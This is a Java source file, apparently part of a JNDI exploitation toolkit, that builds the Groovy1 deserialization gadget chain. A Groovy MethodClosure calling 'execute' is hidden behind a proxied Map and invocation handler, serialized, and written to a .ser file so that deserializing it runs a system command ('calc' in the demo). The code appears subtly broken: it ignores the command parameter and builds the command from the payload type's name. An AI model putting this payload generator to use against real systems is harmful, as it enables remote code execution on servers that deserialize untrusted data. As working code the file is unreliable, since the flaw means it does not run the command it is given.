package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.Map;

public class Groovy1 {

    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("66266.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = String.valueOf(type);

        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

        final Map map = Gadgets.createProxy(closure, Map.class);

        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(handler);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
